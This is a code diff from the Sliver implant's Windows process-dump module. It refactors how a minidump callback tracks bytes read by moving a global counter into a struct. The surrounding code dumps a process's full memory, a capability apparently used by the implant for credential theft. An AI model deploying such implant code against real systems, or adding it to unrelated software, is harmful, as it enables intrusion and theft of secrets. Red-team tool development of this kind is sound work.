@@ -32,10 +32,11 @@ import (
 
 	"bytes"
 	"encoding/binary"
+	"unsafe"
+
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
-	"unsafe"
 )
 
 const (
@@ -69,14 +70,15 @@ const (
 	MiniDumpWithFullMemory = 0x00000002
 )
 
-var bytesRead uint32 = 0
+// var bytesRead uint32 = 0
 
 type WindowsDump struct {
 	data []byte
 }
 
 type outDump struct {
-	outPtr uintptr
+	outPtr    uintptr
+	bytesRead uint32
 }
 
 func (d *WindowsDump) Data() []byte {
@@ -174,9 +176,9 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 		//{{end}}
 		return dump, err
 	}
-	outBuff := make([]byte, bytesRead)
+	outBuff := make([]byte, outData.bytesRead)
 	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))
-	syscalls.RtlCopyMemory(outBuffAddr, outData.outPtr, bytesRead)
+	syscalls.RtlCopyMemory(outBuffAddr, outData.outPtr, outData.bytesRead)
 	err = syscalls.HeapFree(heapHandle, 0, outData.outPtr)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -303,7 +305,7 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 		}
 		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
 		syscalls.RtlCopyMemory(destination, callbackInput.Io.Buffer, callbackInput.Io.BufferBytes)
-		bytesRead += callbackInput.Io.BufferBytes
+		outData.bytesRead += callbackInput.Io.BufferBytes
 	case IoFinishCallback:
 		callbackOutput.Status = S_OK
 	default:
